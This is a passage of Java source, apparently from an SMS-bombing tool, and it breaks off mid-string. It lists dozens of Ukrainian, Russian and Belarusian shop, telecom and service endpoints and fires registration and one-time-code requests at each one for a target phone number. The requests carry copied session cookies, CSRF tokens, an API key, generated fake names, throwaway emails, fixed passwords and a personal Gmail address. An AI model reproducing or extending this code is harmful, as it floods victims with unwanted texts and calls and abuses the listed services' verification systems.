                    request.header("cookie", "_csrf=xYQifFKC9laI6egSGjWPRGtm; connect.sid=s%3ASa6JMAFtEZ4xhHPdQ4_Uf-rUa9CuS1Qh.yeK8TV6j50uCbv4%2FZA5FLDku0QFfOGT%2BIfxe1A5Y5fM; _sticky_param=9; tmr_lvid=d274dc7e5020140f4f55b0cf1cae4b14; tmr_lvidTS=1665154409200; _gid=GA1.2.1613952391.1665154410; _gcl_au=1.1.161777186.1665154411; _ga_TE53H5X77H=GS1.1.1665154412.1.1.1665154412.0.0.0; _gat_gtag_UA_88670217_1=1; _ga=GA1.2.1339359755.1665154410; _gat_gtag_UA_230108653_5=1; _gat_ITRZ=1; _gat_SPB=1; _gat_GA=1;");
                    request.header("referer", "https://sushiwok.ua/kiev/");

                    try {
                        return new JSONObject()
                                .put("phone", format(phone.getPhone(), "+380(**)***-**-**"))
                                .put("numbers", "4")
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new FormService("https://sohorooms.ua/index.php?route=account/register/sms", 380) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("Cookie", "PHPSESSID=6d0d51e8f0da1fe803f36f1c2f53dd01; language=ru; currency=UAH; screen=1536x864; nav=5.0 (Windows NT 10.0; tzo=-180; cd=24; language=ru; referer=sohorooms.ua; referer_marker=1; _gcl_au=1.1.1518637680.1665305924; _gid=GA1.2.1889716149.1665305924; _gat=1; _fbp=fb.1.1665305924935.1029977243; _ga_KFE70ENL3B=GS1.1.1665305924.1.1.1665305926.58.0.0; _ga=GA1.2.1706081357.1665305924; _hjSessionUser_2799148=eyJpZCI6ImQxNmFmZmYyLTJhOWMtNTMxMC1hMTZjLTU2Y2EyMTEwMWJkMiIsImNyZWF0ZWQiOjE2NjUzMDU5MjY3NDMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_2799148=eyJpZCI6IjNkMGVmYmViLTlmYjctNDE0Yy04NTY4LTU1YzUxOGU4MDYzOSIsImNyZWF0ZWQiOjE2NjUzMDU5MjY3NjksImluU2FtcGxlIjpmYWxzZX0=; _hjIncludedInPageviewSample=1; _hjAbsoluteSessionInProgress=0; googtrans=/ru/uk; googtrans=/ru/uk");

                    builder.add("telephone", format(phone.getPhone(), "+38 (***) ***-**-**"));
                }
            },

            new JsonService("https://api.myacuvuepro.ru/myacuvue/oauth/mobile") {
                @Override
                public String buildJson(Phone phone) {
                    request.header("x-api-key", "XoA3wMy3d8LNGDToaWz1yQdjRiKcjLWu");
                    request.header("x-app-version", "PWA 2.3.0");

                    try {
                        return new JSONObject()
                                .put("phoneNumber", phone.toString())
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    String password = getEmail();

                    client.newCall(new Request.Builder()
                            .url("https://www.podrygka.ru/ajax/phone_confirm_code_validate.php")
                            .header("Cookie", "flocktory-uuid=fa9d7b5f-e63e-41ac-8b22-ca3d9cb43072-4; rrpvid=170226106135378; _gcl_au=1.1.1659345411.1665500180; rcuid=6275fcd65368be000135cd22; tmr_lvid=2dbe4e6285f3faa81cefd4b8f8722148; tmr_lvidTS=1665500200389; _gid=GA1.2.36819294.1665500201; _gaexp=GAX1.2.Vinba-iySqGfm4hVoZTHNg.19307.1; _ym_uid=1665500201989305824; _ym_d=1665500201; _ym_visorc=b; _userGUID=0:l94btgzf:8kxn3GOGsBMPYhUZsp9uMhA~IbOYNHP4; dSesn=a770fd10-00e7-53fb-6a46-2134675b5f0f; _dvs=0:l94btgzf:oWakvuAIPIustCKMEotfMlw8A5hyQW7C; BITRIX_SM_SALE_UID=911659922; PHPSESSID=fd931c99d850fa105bcb70c13ac96a95; tmr_detect=0|1665500362277; _ga_49YR0G3D1G=GS1.1.1665500200.1.1.1665500437.60.0.0; _ga_PNTGGG08RK=GS1.1.1665500200.1.1.1665500437.60.0.0; _ym_isad=2; _tt_enable_cookie=1; _ttp=39ad416f-d074-4b3b-88d0-74d3528eb8cc; uxs_uid=7896bf60-4975-11ed-9330-ad6a983eb59f; _ga=GA1.2.1755673402.1665500200; _gat_UA-46690290-1=1; tmr_reqNum=12")
                            .header("x-requested-with", "XMLHttpRequest")
                            .post(RequestBody.create("------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                            "Content-Disposition: form-data; name=\"redirectURL\"\n" +
                                            "\n" +
                                            "\n" +
                                            "------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                            "Content-Disposition: form-data; name=\"repeat_password\"\n" +
                                            "\n" +
                                            password +
                                            "\n------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                            "Content-Disposition: form-data; name=\"sessid\"\n" +
                                            "\n" +
                                            "565e6d624ef833230324400a275412e0\n" +
                                            "------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                            "Content-Disposition: form-data; name=\"first_name\"\n" +
                                            "\n" +
                                            getRussianName() +
                                            "\n------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                            "Content-Disposition: form-data; name=\"last_name\"\n" +
                                            "\n" +
                                            getRussianName() +
                                            "\n------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                            "Content-Disposition: form-data; name=\"email\"\n" +
                                            "\n" +
                                            getEmail() +
                                            "\n------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                            "Content-Disposition: form-data; name=\"phone\"\n" +
                                            "\n" +
                                            format(phone.getPhone(), "+7 ( *** ) *** ** **") +
                                            "\n------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                            "Content-Disposition: form-data; name=\"password\"\n" +
                                            "\n" +
                                            password +
                                            "\n------WebKitFormBoundary8VnGsAfzm5mtbFjn\n" +
                                            "Content-Disposition: form-data; name=\"agree_personal\"\n" +
                                            "\n" +
                                            "Y\n" +
                                            "------WebKitFormBoundary8VnGsAfzm5mtbFjn--",
                                    MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundary8VnGsAfzm5mtbFjn")))
                            .build()).enqueue(callback);
                }
            },

            new JsonService("https://bi.ua/api/v1/accounts", 380) {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "advanced-frontend=m175oep0fvf67qpl3epn8sp60u; _csrf-frontend=88e5d09991180d498981d8431cf84d8db27f5f1f126057fbcc3150fb8b2b14d6a:2:{i:0;s:14:\"_csrf-frontend\";i:1;s:32:\"zYPJtL4SUUfp6FnPeozLAPWWl1RHVXWg\";}; _gcl_au=1.1.220301665.1666887102; sbjs_migrations=1418474375998=1; sbjs_current_add=fd=2022-10-27 19:11:41|||ep=https://bi.ua/|||rf=(none); sbjs_first_add=fd=2022-10-27 19:11:41|||ep=https://bi.ua/|||rf=(none); sbjs_current=typ=typein|||src=(direct)|||mdm=(none)|||cmp=(none)|||cnt=(none)|||trm=(none); sbjs_first=typ=typein|||src=(direct)|||mdm=(none)|||cmp=(none)|||cnt=(none)|||trm=(none); _gid=GA1.2.53598285.1666887102; _hjFirstSeen=1; _hjSession_1559188=eyJpZCI6IjdmZjk4ZjUxLThjZGEtNGYzMy05ZTczLWUxNzcyNDA1MmUyMSIsImNyZWF0ZWQiOjE2NjY4ODcxMDMzNzIsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; _fbp=fb.1.1666887103435.206244386; _p_uid=uid-2e5d5cf42.484adb2db.3d26406f7; _hjSessionUser_1559188=eyJpZCI6IjQ3ZDlkZDBiLTQ4ZDItNTdhOC05YjkyLTA3YjI2MGM2NDZjOSIsImNyZWF0ZWQiOjE2NjY4ODcxMDMzMTksImV4aXN0aW5nIjp0cnVlfQ==; _hjIncludedInSessionSample=0; sbjs_udata=vst=2|||uip=(none)|||uag=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.52; sbjs_session=pgs=1|||cpg=https://bi.ua/ukr/signup/; _dc_gtm_UA-8203486-4=1; _ga_71EP10GZSQ=GS1.1.1666889396.2.1.1666889403.53.0.0; _ga=GA1.1.228057617.1666887102; _gali=emailPhone");
                    request.header("language", "uk");

                    try {
                        return new JSONObject()
                                .put("grand_type", "call_code")
                                .put("login", getRussianName())
                                .put("phone", phone.toString())
                                .put("stage", "1")
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new JsonService("https://registration.vodafone.ua/api/v1/process/smsCode", 380) {
                @Override
                public String buildJson(Phone phone) {
                    try {
                        return new JSONObject()
                                .put("number", phone.toString())
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new JsonService("https://megasport.ua/api/auth/phone/?language=ua", 380) {
                @Override
                public String buildJson(Phone phone) {
                    try {
                        return new JSONObject()
                                .put("phone", "+" + phone.toString())
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new JsonService("https://lc.rt.ru/backend/api/lk/user", 7) {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "9f4f336f6f7d6675fa0f0e9148c541ed=d6acbdd529a9190f323b42f389c69cbc; 3ab55dd37f775ece19b2e3ceee2c84f5=a5b234824bc53bee9a3e12d3c3df7a96; _ym_uid=1666890907592977795; _ym_d=1666890907; amplitude_id_203a27827b8ff81b5b583aa58b07799brt.ru=eyJkZXZpY2VJZCI6IjI3MTU3YWJkLWMxOTgtNDU1Ni05ZThiLTVkMTRiMTViOTNiYVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTY2Njg5MDkwNjkyNywibGFzdEV2ZW50VGltZSI6MTY2Njg5MDkwNjkyNywiZXZlbnRJZCI6MCwiaWRlbnRpZnlJZCI6MCwic2VxdWVuY2VOdW1iZXIiOjB9; _ym_visorc=w; ahoy_visitor=f84331f8-a3d6-4ca9-bd4b-fbb313b7b07a; ahoy_visit=5c322d7d-24e3-4716-9cee-61763f8ece19; _ym_isad=2; _a_d3t6sf=duMvII_RZFH2V0RbH3OHtSJP; _edtech_session=yVwf56MV9mW+fMURg6WTDi9KlKTWuiwxtyJNdaMixpDqGZR9QzCDYuB3tScZ+ZIRXhVNjUy/EI2As6rMgj/qWhXM8ZC7xXo=--pz5saz3tM1rt/Axo--AqlZIt6hBq68BAEuztHwEA==; TS01f13338=0194c94451ad1f787e1ee5e671fda0c838612d15f13c1258e0c407d9871c53096381b029b87318c8a07e108f1092a9b783fdd2c2c90a0efa6c7c46a98db95cdb29c39619d2a6203a2d5cb43cbaa53528a7c61d7d5a7489eb1dc4028e48c65fcf514d7a6a2c79f325038c97ad39086d017e5f9358f6");

                    try {
                        return new JSONObject()
                                .put("email", "dmitrijkotov634@gmail.com")
                                .put("first_name", getRussianName())
                                .put("grade_tag", "1 класс")
                                .put("last_name", getRussianName())
                                .put("password", "123456789qwertyQWERTY_")
                                .put("password_confirmation", "123456789qwertyQWERTY_")
                                .put("phone", phone.getPhone())
                                .put("region_id", "77")
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new FormService("https://ilmolino.ua/api/v1/user/auth", 380) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("Cookie", "dae23e1f6b5bf8609e2224d695520311=uk-UA; _ga=GA1.2.1143011635.1665315863; 5c56ddacb7d52afbab2130776ac59994=t3ur4081qmdghtv0p3qvr12m5f; _fbp=fb.1.1666892652193.1052781207; _gid=GA1.2.1914159569.1666892656; _gat_gtag_UA_200520041_1=1");

                    builder.add("phone", "0" + phone.getPhone());
                    builder.add("need_skeep", "");
                }
            },

            new JsonService("https://shop.milavitsa.by/api/accounts/signUp", 375) {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "_ym_uid=1669561951420317747; _ym_d=1669561951; _ga_1N8M41LBJN=GS1.1.1669561950.1.0.1669561950.0.0.0; _ga=GA1.1.1063980318.1669561951; _ym_visorc=w; _ym_isad=2");

                    try {
                        return new JSONObject()
                                .put("email", "bayeyip588@runfons.com")
                                .put("name", getRussianName())
                                .put("password", "Eeza.zBw_RQnRx7")
                                .put("passwordConfirm", "Eeza.zBw_RQnRx7")
                                .put("phone", phone.toString())
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new FormService("https://e-zoo.by/local/gtools/login/", 375) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("phone", format(phone.getPhone(), "+375(**)*** ** **"));
                }
            },

            new ParamsService("https://myfin.by/send-code/verify", 375) {
                @Override
                public void buildParams(Phone phone) {
                    request.header("cookie", "_ym_uid=16701561781022942428; _ym_d=1670156178; _fbp=fb.1.1670156178980.265937461; _csrf=94355b3458805f379ef8f8bb595e1efe5c736145b680d3ca0b6b6e1075355d0ea:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"aGKKPUlt553LKlYGo4MCSpOnadr - opGA\";}; PHPSESSID=0pr0eiesva2sck5i7spck8c0d5; _ym_isad=2; _ym_visorc=b; _ga_MBM86B183B=GS1.1.1671291859.3.0.1671291859.0.0.0; _ga=GA1.2.832821120.1670156179; _gid=GA1.2.52421973.1671291860; _gat_UA-33127175-1=1");
                    request.header("x-csrf-token", "4MD0-i3YOqmZnr8ow6WKZEku5BC13JoWgTEHQY1bg5uBh7-xfY1W3ayrjGSIydMjJhqpU-as1XjgVXVs4ivE2g==");
                    request.header("x-requested-with", "XMLHttpRequest");

                    builder.addQueryParameter("action", "sendSms");
                    builder.addQueryParameter("phone", format(phone.getPhone(), "375(**)***-**-**"));
                    builder.addQueryParameter("userIdentityId", "undefined");
                    builder.addQueryParameter("ga", "GA1.2.832821120.1670156179");
                }
            },

            new FormService("https://belwest.by/ru/register/sendCode", 375) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("Cookie", "JSESSIONID=3128BE9342EDB0870F1A110B21CEBEDE; cookie-notification=NOT_ACCEPTED; _gid=GA1.2.1133217827.1670156447; _gat_UA-102366257-1=1; _gat_UA-102366257-3=1; _fbp=fb.1.1670156446924.1246257691; _clck=1dikqyz|1|f74|0; _ym_uid=167015644875968174; _ym_d=1670156448; _ym_isad=2; _ym_visorc=w; _ga_3PWZCWZ7CZ=GS1.1.1670156447.1.1.1670156471.0.0.0; _ga=GA1.2.281260943.1670156447; _clsk=uolfne|1670156472944|2|1|i.clarity.ms/collect");
                    request.header("x-requested-with", "XMLHttpRequest");

                    builder.add("mobileNumber", phone.getPhone());
                    builder.add("mobileNumberCode", phone.getCountryCode());
                    builder.add("CSRFToken", "46031ff7-214b-41fc-80f6-96d251219626");
                }
            },

            new FormService("https://shop.by/management/user/register/?phone=2&lctn=shopby/", 375) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("Cookie", "csrf-token=RJUejcwixKQ1xRcJ; _gid=GA1.2.1680945104.1670156802; _ym_uid=1670156803918643804; _ym_d=1670156803; _gcl_au=1.1.1670310313.1670156803; _gat=1; tmr_lvid=b675e317596c82679c35aa345dd1c925; tmr_lvidTS=1670156803069; _ym_isad=2; _ga=GA1.1.779770407.1670156802; tmr_detect=0|1670156806498; PHPSESSID=lsi108lvrs9arj36vev8ub9ht5; _ga_820MZ1YKJX=GS1.1.1670156803.1.0.1670156817.46.0.0");
                    request.header("x-requested-with", "XMLHttpRequest");

                    builder.add("LRegisterForm[phone]", format(phone.getPhone(), "+375 (**) ***-**-**"));
                    builder.add("LRegisterForm[personal_data_privacy_policy]", "0");
                    builder.add("LRegisterForm[personal_data_privacy_policy]", "1");
                }
            },

            new FormService("https://vprok.prostore.by/get-assistant-code", 375) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("Cookie", "_ym_uid=1670157057914379197; _ym_d=1670157057; _ga=GA1.2.1178854623.1670157057; _gid=GA1.2.239203896.1670157057; _gat_gtag_UA_163877616_1=1; _gat=1; _ym_isad=2; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6InFUUVI1bnpcL245bG1nR3hEUDlBSDlRPT0iLCJ2YWx1ZSI6InE4NVdIc1daUFRTVlwvYU83RlZHT3pVR0puWFZVeHhpcWJzZlVSRHN3RXhzcnJjbHNmOXRvXC8rT2RtdWF0YW9ReiIsIm1hYyI6IjQxOTBkMzg4MTVjNmE4ODQ1ZDAyMWE4NTNmZDYxNGU2NzQ1M2ZmYWZiYWNmZTk1NTUxZThjY2YyZDMzZGY4OGYifQ==; laravel_session=eyJpdiI6InpXVGd6U2V4VXFER0ZlXC9zXC9VWkI0dz09IiwidmFsdWUiOiJEdDVXcFl2QkZYVWlFWjBlVTllVTErc3R4R3g4RENiTXR3ak1rek1HNzY5OGZBb2hEM0xxcUh0SXRHaFA3aU9OcFBcLytkZ3Z4T2sxQnBjV3lTUWxCVUFzMHVMVjRLd0dXYnhMc0NQcWVyUWlmTVNIVGM2NWFFa2NiWW9oYlQzV2giLCJtYWMiOiIyOGJhZmJiNjc5ZjAyODg1NjhkNzJiZmJiMmZkMDIwMjRlNTRlM2M0OTdjZDU0NGRhNTg3ZGZkNjA4YzkxYzgxIn0=");
                    request.header("x-requested-with", "XMLHttpRequest");

                    builder.add("register_phone", format(phone.getPhone(), "(**) *** ** **"));
                    builder.add("_token", "RPKvgHhO1hiwEaYNfre7og7JiwD4ArxDrp4umzhW");
                }
            },

            new JsonService("https://www.slivki.by/login/phone/send-code", "PATCH") {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "PHPSESSID=r6uocec2pcnjpnr9fjls12g7el; _gid=GA1.2.674791248.1670157758; _ga_VGFW27H90X=GS1.1.1670157757.1.0.1670157757.0.0.0; _ga=GA1.1.272570267.1670157758; _fbp=fb.1.1670157758128.294592220; _tt_enable_cookie=1; _ttp=57c80ff9-4ea7-4ec1-b60a-78ab42fd080c; _ym_uid=1670157760103754562; _ym_d=1670157760; refresh=1; fullSiteBanner1=babahnem-baj; _ym_isad=2; googtrans=null; googtrans=null; googtrans=null");

                    try {
                        return new JSONObject()
                                .put("phoneNumber", "+" + phone.getCountryCode() + format(phone.getPhone(), "******-**-**"))
                                .put("token", "acb6aea77.KMOmk0lXMQw24Jdp3cfj3DAhf7f_6V9PormobRsXxQk.GKjk3wpjQn18rqQB6JWqkR1TOPSejAwE1szMVXVk8XlLt5ThMw95PEWnwg")
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new JsonService("https://www.bookvoed.ru/api/otp/create", 7) {
                @Override
                public String buildJson(Phone phone) {
                    try {
                        return new JSONObject()
                                .put("phone", phone.toString())
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    client.newCall(new Request.Builder()
                            .url("https://xn--80aeec0cfsgl1g.xn--p1ai/register/sms")
                            .header("x-xsrf-token", "eyJpdiI6Ill3TFZkZW5ZODdhMDQ3aU9vOEZpbHc9PSIsInZhbHVlIjoiRlVsakd5R2xPNVE2ZUlmXC9yWXJTSGIzN1wvbDZRR05YeFk1WmRiM3pMeGRJSU4rNEcwNHRSZ3ppS3BHNTl2KzRYIiwibWFjIjoiZjM0YTA3NGVjOTZiN2M0NmY0OGY0MDdlMzI1OGE1M2Y4Y2M5N2I5YzIwOGJiZTFkNzA0ZjQ1MzViMzlmMWYxZSJ9")
                            .header("Cookie", "_ga=GA1.2.1794528238.1670160259; _gid=GA1.2.2107102391.1670160259; _ym_uid=1670160260319820000; _ym_d=1670160260; _ym_isad=2; _ym_visorc=w; tmr_lvid=48e6229f0b5dd99ebdc841777c57c535; tmr_lvidTS=1670160262034; _fbp=fb.1.1670160262307.2060817164; tmr_detect=0|1670160268941; XSRF-TOKEN=eyJpdiI6Ill3TFZkZW5ZODdhMDQ3aU9vOEZpbHc9PSIsInZhbHVlIjoiRlVsakd5R2xPNVE2ZUlmXC9yWXJTSGIzN1wvbDZRR05YeFk1WmRiM3pMeGRJSU4rNEcwNHRSZ3ppS3BHNTl2KzRYIiwibWFjIjoiZjM0YTA3NGVjOTZiN2M0NmY0OGY0MDdlMzI1OGE1M2Y4Y2M5N2I5YzIwOGJiZTFkNzA0ZjQ1MzViMzlmMWYxZSJ9; podatvsudrf_session=eyJpdiI6Iml6U1F3R0syeDNDMTVSSXV1UWZ3VVE9PSIsInZhbHVlIjoiOHY0ZDVVV1hNcGhlSmEweGxQZklnRjY0V2htZ2YreG5GaG9YS3lGVFpIWGlEQjdtNTRPRjFHRjlDbEdBbVJ6RCIsIm1hYyI6IjQxMjRlNWNmYjU2NjQ4N2I3ZWU1YzVhNGJkMTI1YTY4YTY0YzViODZlMDIyMDIzY2RmNGMyNDVhMWQzZjVjOTUifQ==")
                            .post(RequestBody.create("------WebKitFormBoundaryojtGN2EYSA0JevB6\n" +
                                            "Content-Disposition: form-data; name=\"phone\"\n" +
                                            "\n" +
                                            phone +
                                            "\n" +
                                            "------WebKitFormBoundaryojtGN2EYSA0JevB6--",
                                    MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryojtGN2EYSA0JevB6")))
                            .build()).enqueue(callback);
                }
            },

            new JsonService("https://delivio.by/be/api/register", 375) {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "_gcl_au=1.1.1476918049.1670159308; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _gid=GA1.2.2091401158.1670159308; _ym_uid=1670159309267213207; _ym_d=1670159309; _fbp=fb.1.1670159309067.59569870; _ga=GA1.2.170754787.1670159308; _ga_SK36CGG6EZ=GS1.1.1670170177.2.1.1670170181.56.0.0; _ym_isad=2");

                    try {
                        return new JSONObject()
                                .put("phone", "+" + phone)
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new FormService("https://imarket.by/ajax/auth.php", 375) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("Cookie", "BITRIX_SM_GUEST_ID=29787461; BITRIX_SM_is_mobile=N; BITRIX_SM_SALE_UID=1105317986; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; _gcl_au=1.1.1013370155.1670159832; _gid=GA1.2.393902877.1670159832; tmr_lvid=8a0e231161a3fa361d43504aa1f00459; tmr_lvidTS=1670159832283; _ym_uid=1670159833318352265; _ym_d=1670159833; enPop_sessionId=f6dadec7-73d5-11ed-b494-ea4186e0ba49; _ms=1529516c-d7d6-40d3-b567-d1a56c996a55; _ym_isad=2; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; clickanalyticsresource=ef8556dd-b8be-47a4-8a36-a41b5c8ec1ea; PHPSESSID=Kd4Bx0rSsKWDxx24PP1mWvZLbQ3ZfUAf; _gat_UA-54357557-1=1; _ga_HKDSD3883C=GS1.1.1670174396.2.0.1670174396.60.0.0; _ga=GA1.1.992877548.1670159832; _ym_visorc=b; tmr_detect=0|1670174398465; BITRIX_SM_LAST_VISIT=04.12.2022+20:20:04");
                    request.header("x-requested-with", "XMLHttpRequest");

                    builder.add("action", "phoneReg");
                    builder.add("PHONE_NUMBER", format(phone.getPhone(), "+375 (**) ***-**-**"));
                    builder.add("PHONE_CODE", "");
                }
            },

            new JsonService("https://bellavka.ru/account/opt-generate") {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "XSRF-TOKEN=eyJpdiI6ImdDblNPSkFBNGtiUVZtcFp4TGpVdmc9PSIsInZhbHVlIjoiVWZGb3pFRE5DSHFsOFhBQmFmd0xkaDhOWGxrbmpKdldHdVRRWmFDUjR5WGtUZVJqZy9DV0Z3UnA3ZXdkNGhaNjhWcHNOTjZWMlVpWUE0VjFLRTQ5eU5sVndTYU5WYlRaT2RYYjVIVEFRdGxuMjlLQUU3K1AxQlVkVWUwN01nNVciLCJtYWMiOiI2NDM2MDIyMThhZWYyZGE2MGZjYjJkZjkzMDIyY2YyOTZhNjAwN2UxZDkzZGFlYjE4ZGU0NjMxZWFiYmI3OGQ3IiwidGFnIjoiIn0=; bellavka_session=eyJpdiI6InhWdDd3V3NIbVJWNFZEMW5yMHhNMUE9PSIsInZhbHVlIjoia2lpVEtRRVZ2ZWJJVVVjR1YzOXJYeWI5R0FmUzdDaWJTTHFnV2p6ZWV1L0hEeEhjdDhiWjZBejQ5K1FHVXkvQnFyTzUySU95OEJVR290K0lnT1NIRnRpRjVmYnFjQ3QrTm1sVVlySmcrNGhkQkI2dStKNDM4Rk5mNjBQL01ST2QiLCJtYWMiOiI2ZmMxNzdlYzhlMjc5NzM0MjdkYTJmNDE2MTJjMDUzM2ZiOGEwODE1OGI5Y2I5NTZiYWQzN2ZlZWU3OGE5NmIyIiwidGFnIjoiIn0=; rtb_house_group=A; _gcl_au=1.1.1136927887.1670776975; mla_visitor=d4e74717-2a1b-455a-94ed-8e73501b27cc; _fbp=fb.1.1670776975610.1692806746; tmr_lvid=dc2e22dbe61263cdc7c57c0643d25038; tmr_lvidTS=1670776975625; _ga=GA1.2.1059404942.1670776976; _gid=GA1.2.1803737563.1670776976; _dc_gtm_UA-58872796-1=1; roistat_visit=6437669; roistat_first_visit=6437669; roistat_visit_cookie_expire=1209600; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; _tt_enable_cookie=1; _ttp=d8dee30d-3c75-4a8b-989d-182d5966f0aa; _ym_uid=1670776977795607508; _ym_d=1670776977; roistat_cookies_to_resave=roistat_ab,roistat_ab_submit,roistat_visit; _ym_visorc=b; c2d_widget_id={\"2c46884b8fdc593de5bda7398101432f\":\"[chat]ab4435978f3eddc4b629\"}; ___dc=d88d1645-d706-4434-8c88-18d445dc20d0; _ym_isad=2; mlaVisitorDataCheck=true; tmr_detect=0|1670776980204");
                    request.header("x-xsrf-token", "eyJpdiI6ImdDblNPSkFBNGtiUVZtcFp4TGpVdmc9PSIsInZhbHVlIjoiVWZGb3pFRE5DSHFsOFhBQmFmd0xkaDhOWGxrbmpKdldHdVRRWmFDUjR5WGtUZVJqZy9DV0Z3UnA3ZXdkNGhaNjhWcHNOTjZWMlVpWUE0VjFLRTQ5eU5sVndTYU5WYlRaT2RYYjVIVEFRdGxuMjlLQUU3K1AxQlVkVWUwN01nNVciLCJtYWMiOiI2NDM2MDIyMThhZWYyZGE2MGZjYjJkZjkzMDIyY2YyOTZhNjAwN2UxZDkzZGFlYjE4ZGU0NjMxZWFiYmI3OGQ3IiwidGFnIjoiIn0=");
                    request.header("x-requested-with", "XMLHttpRequest");

                    try {
                        return new JSONObject()
                                .put("contact", "+" + phone)
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new FormService("https://zhivika.ru/auth/sms", 7) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("x-csrf-token", "EtlLqSCbRzS5Qb8bQSL8mkvYw4rZK2j3CE8EilaF");
                    request.header("Cookie", "XSRF-TOKEN=eyJpdiI6IksrVFRRY0o3bXdPU1Rpd2wxeCtMVGc9PSIsInZhbHVlIjoiTGJsd01MUm5lTGFZNTBHaXpPazlFcmx6NUh1M3VTT2ZQUzg3QnR2c3hMdFhkS3VQU0JCSW9EVkRPbVQ3ZTBjMCIsIm1hYyI6ImM2ZGFjYWFhZTI3MDE5MmI2ZTJjN2U1YjAyMTUwMDRmYzdhNGI3NjQyNTc4NzAzYzE1ZmY3YWRlMDUzMjEwYmMifQ==; laravel_session=eyJpdiI6ImswZzFndXFmbVNXeFBiaUZLSkcyMVE9PSIsInZhbHVlIjoiNEg4ZkRNR3hvSzNzQWp4YndUazhHOFJrcXF0cUVIUzlmUElFU0s4OVh0TkhEY0lLWXNXRmk3VXg4cVB6N3dtdiIsIm1hYyI6IjcxZDVhNWVmYjI4NDg4ZGI5NzRmYTc4ZmU2ZjY2ZTdjNjlkMjdmODc2OGEwNmQ3OGVjYmQ2M2E2MjQ0NTUxNGEifQ==; session_id=eyJpdiI6InJJVXNvYjhqeVpUVGVEcEpwS1VNY0E9PSIsInZhbHVlIjoicGdHU2FOSkJkZ1wvNjZ5YzZRWHByMDNQclZcL2JINTBZV0hRVXVJYXZqcjBqbkxMMzFXYjRnZEtzSUptbjdzNVc0aFZxdHN6bnZZYk5zXC9sbkQyUnlyRXc9PSIsIm1hYyI6IjI5YzlmNjNjZjVmOWJkMTY0MTNjY2ZjOGYzMWM2ODJlNzFlNTAzYjEwNzNjZjNiMDU3ZmE4MWQ1YzhlOGNiMjgifQ==; 